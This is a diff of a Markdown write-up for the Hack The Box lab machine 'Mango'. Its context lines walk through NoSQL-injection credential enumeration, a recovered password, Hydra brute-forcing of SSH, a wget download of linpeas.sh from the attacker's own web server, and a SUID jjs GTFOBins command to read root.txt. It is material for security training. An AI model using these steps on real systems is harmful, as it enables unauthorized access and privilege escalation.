@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Cap.png
+![Cap.png](../assets/mango_assets/Cap.png)
 
 ### Enumeration
 
@@ -64,7 +64,7 @@ Ok cool, after reviewing the Nmap findings lets go ahead and add staging-order.m
 
 Navigating to staging-order.mango.htb on port 80 we find a login page:
 
-site.png
+![site.png](../assets/mango_assets/site.png)
 
 Now with a name like Mango, my first thought is wondering if the database is MongoDB. Before spending much time trying to bypass this login with common SQL injection techniques, I try firing off https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration, to see if we can grab some credentials. 
 
@@ -187,7 +187,7 @@ t9KcS3>!0B#2
 
 From here I'll add the usernames and passwords to files users.txt and passwords.txt, respectively. Once added I'll use Hydra to see if we have a valid combo to login to SSH with:
 
-hydra.png
+![hydra.png](../assets/mango_assets/hydra.png)
 
 Cool, looks like we can SSH as user mango:
 
@@ -225,11 +225,11 @@ admin
 
 Cool, that worked! Now we can grab that user.txt flag, after running `python3 -c 'import pty;pty.spawn("/bin/bash")'` to stabilize the shell:
 
-user_flag.png
+![user_flag.png](../assets/mango_assets/user_flag.png)
 
 ### Privilege Escalation
 
-After poking around the box manually for awhile, I wasn't seeing much and decided to upload LinPeas.sh to help out with enumeration. I started a Python web server using `python -m http.server 80` and grabbed the linpeas.sh file using wget:
+After poking around the box manually for awhile, I wasn't seeing much and decided to upload LinPeas to help out with enumeration. I started a Python web server using `python -m http.server 80` and grabbed the linpeas.sh file using wget:
 
 ```text
 admin@mango:/tmp$ wget http://10.10.14.13/linpeas.sh
@@ -249,11 +249,11 @@ admin@mango:/tmp$ ./linpeas.sh
 
 LinPeas quickly finds that `/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs` has the SUID bit set.
 
-linpeas.sh
+![linpeas.sh](../assets/mango_assets/linpeas.sh)
 
 Lets see if we can use https://gtfobins.github.io/ here. Looks like there is an interesting series of commands we can run to use jjs to read files. Lets try to use this to read the root.txt file:
 
-gtfobins.png
+![gtfobins.png](../assets/mango_assets/gtfobins.png)
 
 Lets try to run the following:
 
@@ -266,13 +266,13 @@ while ((line = br.readLine()) != null) { print(line); }' | jjs
 
 Nice! That worked and we were successfully able to read the root.txt flag.
 
-root_flag.png
+![root_flag.png](../assets/mango_assets/root_flag.png)
 
 ### Something Extra
 
 While I believe the above jjs privesc was the intended route, I always prefer to have an actual shell as root. Going back to my LinPeas output, I see it picked up another possibility to escalate privileges: PwnKit.
 
-pwnkit_linpeas.png
+![pwnkit_linpeas.png](../assets/mango_assets/pwnkit_linpeas.png)
 
 This is extremely simple to exploit, and is also extremely common on older, unpatched machines.
 
